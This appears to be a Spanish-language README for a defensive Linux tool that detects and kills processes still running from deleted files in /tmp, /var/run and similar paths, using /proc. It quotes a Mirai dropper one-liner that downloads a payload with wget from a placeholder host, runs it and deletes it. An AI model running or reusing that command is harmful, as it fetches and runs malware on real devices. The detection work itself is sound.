# unlinked-hunter
Detecta y mata procesos fantasma: procesos que siguen corriendo en memoria aunque el binario o script desde el que se lanzaron ya fue borrado del disco

**Contexto**: de dónde salió la idea
Analizando un malware de la familia Mirai, encontré este one-liner:

dropper -> cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.0.2.1/mal.mips; chmod +x mal.mips; ./mal.mips; rm -rf mal.mips
- Se posiciona en el primer directorio donde probablemente tenga permisos de escritura
- Descarga de server un archivo (depende arquitectura).
- Le da permisos de ejecucion.
- Lo ejecuta.
- Lo elimina de memoria.

Después del paso 5 no queda nada en el disco, pero el proceso sigue corriendo: el código ya está en memoria.

Mirai es una familia de malware tipo botnet, hecha para infectar dispositivos IoT con sistemas basados en Linux.

**La idea** -> Matar los procesos que corren desde archivos que ya no existen en el disco.

**El problema** es que no todo proceso con un archivo borrado es malicioso:

- Muchos programas (navegadores, bases de datos) crean archivos temporales, los abren y los borran enseguida, para que se limpien solos al cerrarse.
- Hay logs borrados en los que se sigue escribiendo.

Es normal en muchos casos. Así que hay que filtrar bien.

**Primer intento**: lsof

lsof lista todos los archivos abiertos por todos los procesos, y los borrados aparecen con la marca (deleted). La idea era:

Listar con lsof.
Filtrar por ruta sospechosa (/tmp, /mnt, /root, /var/run).
Filtrar por deleted.
Buscar el proceso por el nombre del archivo (basename).
Matarlo.

**Problemas:**

lsof -wPn | grep deleted | grep -E "/(tmp|mnt|root|var/run)/" | awk '{print $2}'

1. Buscar por nombre de archivo no identifica al proceso. Si quiero matar el que corre /tmp/archivo.py, pero busco por archivo.py, también matcheo /home/archivo.py, que no tiene nada que ver.

2. El mismo PID aparecía varias veces. lsof imprime una línea por cada file descriptor. Si un proceso tenia 3 archivos abiertos, aparecian 3 fd distintos con el mismo PID... pero bueno, con un sort -u o uniq se arreglaba. 


**Solucion final**: /proc

al final lsof saca todo de /proc, asi que al final es un poco de lo mismo. solo fui a la fuente.

En linux cada proceso vivo es una carptea en /proc con el numero de su PID. 
el file exe es un link al binario ejecutado
el directorio fd cuenta con el file descriptor, si existe el file 255 es porque es un shell script. 
el file cmdline lo podriamos usar para algunos interpretados, pero no va a entrar en el script.

Cuestion, si en alguno de esos files, esta el link con el string **(deleted)**, entonces lo podemos usar. 

**donde vamos a mirar:**

- /proc/[pid]/exe
- /proc/[pid]/fd/255

Por que no alcanza con unicamente mirar exe? 
Porque un script no es ejecutable... el kernel lee el shebang (si es que tiene) y carga el interprete, entonces ese exe apunta al interpretador (/usr/bin/bash)


**Cómo decide qué matar**

Para cada proceso en /proc:
1 - ¿exe está en un directorio sospechoso y termina en (deleted)? → binario borrado.
2 - ¿fd/255 está en un directorio sospechoso y termina en (deleted)? → script borrado.
3 - Si se cumple alguna, se copia la muestra (/proc/PID/exe o /proc/PID/fd/255 se pueden copiar aunque el archivo ya no exista en disco) y se mata el proceso.

**Uso**

**Necesita root** para leer /proc de todos los procesos y para matarlos.
 
sudo ./ghostproc
sudo bash ghostproc

Las muestras se guardan en:

/tmp/copy/bin/: binarios
/tmp/copy/sh/: scripts
/tmp/copy/stderr: errores
